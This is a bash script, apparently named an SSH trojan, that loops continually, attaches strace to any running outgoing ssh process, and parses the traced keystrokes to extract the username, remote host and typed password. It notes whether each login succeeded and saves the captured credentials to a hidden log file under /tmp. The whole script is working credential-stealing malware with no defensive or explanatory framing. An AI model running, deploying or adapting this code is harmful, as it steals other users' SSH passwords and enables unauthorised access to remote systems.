#!/bin/bash
file_log="/tmp/.log_sshtrojan2.txt"
file_log2="/tmp/log.txt"
if ! [[ -f $file_log ]]; then 
    touch $file_log
fi
if ! [[ -f $file_log2 ]]; then
    touch $file_log2
fi


while true :
do
    pid=`ps aux |grep ssh| grep @ |head -n1| awk '{print $2}'`
    if [[ $pid != "" ]]; then
        strace -e trace=read,write -p $pid -f -o $file_log2
    is_password="false"
    cat $file_log2 | while read -r line
	do
		# Extract password from log file
	    if [[ `echo $line | grep "password"` ]]
	    then
		# echo $line
		username=`echo $line | cut -d '"' -f2 | cut -d '@' -f1`
		remote_host=`echo $line | cut -d '"' -f2 | cut -d "'" -f1 | cut -d '@' -f2`
		is_password="true"
	    fi
	    if [[ `echo $line | grep -w "denied"` ]]
	    then
		echo -e " - Incorrect password \n" >> $file_log
    	    fi
	    if [[ `echo $line | grep "Last login"` || `echo $line | grep -w "Welcome"` ]]
	    then
		echo -e " - Correct password \n" >> $file_log
	    fi
		
	    if [[ $is_password == "true" ]]
	    then
		ch=`echo $line | grep read\( | cut -d'"' -f2 | cut -d'"' -f1`
		if [[ $ch == "\\n" || $ch == "\\r" ]]; then
			# echo ${password}
	  	    command_bin_location=`whereis ${password} | awk -F ': ' '{ print $2 }'`
		    if [[ $command_bin_location == "" ]]
		    then
			echo "Time:" `date` >> $file_log
			echo "Username:" $username  >> $file_log
			echo "Remote host:" $remote_host >> $file_log
			echo "Password:" $password >> $file_log
		    fi
			is_password="false"
			break
		    else
			password+=$ch
		    fi           
		fi
    done
    fi
done